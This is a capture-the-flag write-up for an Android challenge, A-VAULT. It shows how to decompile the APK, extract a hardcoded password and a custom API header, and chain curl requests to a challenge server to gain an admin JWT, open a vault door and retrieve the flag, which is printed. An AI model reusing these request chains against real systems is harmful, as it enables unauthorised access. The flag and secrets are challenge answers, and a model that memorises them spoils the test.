# A-VAULT — Mobile CTF Challenge Writeup

**Challenge:** A-VAULT  
**Author:** Ephvuln  
**Category:** Mobile / Android Reverse Engineering  
**Flag:** `CTF{a718900e378c200b52c3283fceeb24a885a14470907bcceec23b4b1253d40909}`

---

## Description

> The A-VALUT system is the latest in high-tech secure storage solutions. It provides a real-time encrypted video feed and remote access control via a dedicated mobile application.
>
> We've managed to get our hands on the official Android client used by the facility's security team. Your goal is to penetrate the system and open the safe.

We are given an Android APK and a remote server at `https://34.185.153.233:31320`.

---

## Step 1 — Decompile the APK

Decompiling the APK (e.g. with JADX), we find the main app package at `com.cyberedu.avalut` with these key activities:

- **MainActivity** — Entry point; takes server address + port
- **LoginActivity** — Authenticates with a password
- **FeedActivity** — Displays a live video feed from the vault camera
- **SecurityOptionsActivity** — Controls the vault door (open/close)

## Step 2 — Extract Hardcoded Secrets

### Custom API Header

In `c2/o.java` (the HTTP client class), every request includes a mandatory custom header:

```java
httpsURLConnection.setRequestProperty("A-VALUT", "x-monitor-client-921754");
```

Without this header, the server returns `Forbidden`.

### Hardcoded Password

In `n3/f.java` (the login screen composable), the password is checked **client-side** before being sent to the server:

```java
boolean zA = q4.i.a((String) a1Var5.getValue(), "R4M_$tonks");
```

The hardcoded password is: **`R4M_$tonks`**

## Step 3 — Understand the API Flow

From the decompiled code, we identify four endpoints:

| Endpoint | Method | Auth | Purpose |
|---|---|---|---|
| `/anon` | GET | None | Returns an anonymous JWT token |
| `/login` | POST | Bearer token | Authenticates with password, returns admin JWT |
| `/feed` | GET | Bearer token | Returns the vault camera feed (PNG image) |
| `/security/options` | POST | Bearer token | Controls the vault door (`{"door":"open"}`) |

The flow is:
1. Hit `/anon` to get an initial anonymous JWT
2. Use that JWT + the password to `/login` and get an authenticated admin JWT
3. Use the admin JWT to interact with `/feed` and `/security/options`

## Step 4 — Exploit

### 4.1 — Get Anonymous Token

```bash
curl -sk -H "A-VALUT: x-monitor-client-921754" \
  https://34.185.153.233:31320/anon
```

Response:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpYXQiOi..."}
```

Decoded JWT payload:
```json
{"id": 0, "client": "android_client", "iat": 1771602165, "exp": 1771605765}
```

### 4.2 — Login with Hardcoded Password

```bash
curl -sk -X POST \
  -H "Content-Type: application/json" \
  -H "A-VALUT: x-monitor-client-921754" \
  -H "Authorization: Bearer <ANON_TOKEN>" \
  -d '{"password":"R4M_$tonks"}' \
  https://34.185.153.233:31320/login
```

Response contains a new JWT with **admin privileges**:
```json
{"id": 0, "client": "android_client", "isAdmin": true, "iat": ..., "exp": ...}
```

### 4.3 — Open the Vault Door

```bash
curl -sk -X POST \
  -H "Content-Type: application/json" \
  -H "A-VALUT: x-monitor-client-921754" \
  -H "Authorization: Bearer <AUTH_TOKEN>" \
  -d '{"door":"open"}' \
  https://34.185.153.233:31320/security/options
```

Response: `Door opened`

### 4.4 — Retrieve the Flag from the Camera Feed

```bash
curl -sk -o feed.png \
  -H "A-VALUT: x-monitor-client-921754" \
  -H "Authorization: Bearer <AUTH_TOKEN>" \
  https://34.185.153.233:31320/feed
```

The returned PNG (1024×1024) shows the vault camera feed with the flag visible inside the now-open safe:

```
CTF{a718900e378c200b52c3283fceeb24a885a14470907bcceec23b4b1253d40909}
```

---

## Summary

| Step | Action |
|------|--------|
| 1 | Decompile APK to extract hardcoded password (`R4M_$tonks`) and custom header (`A-VALUT: x-monitor-client-921754`) |
| 2 | Call `/anon` with the custom header to get an anonymous JWT |
| 3 | Call `/login` with the anonymous JWT + hardcoded password to get an admin JWT (`isAdmin: true`) |
| 4 | Call `/security/options` with `{"door":"open"}` to unlock the vault |
| 5 | Call `/feed` to retrieve the camera image containing the flag |
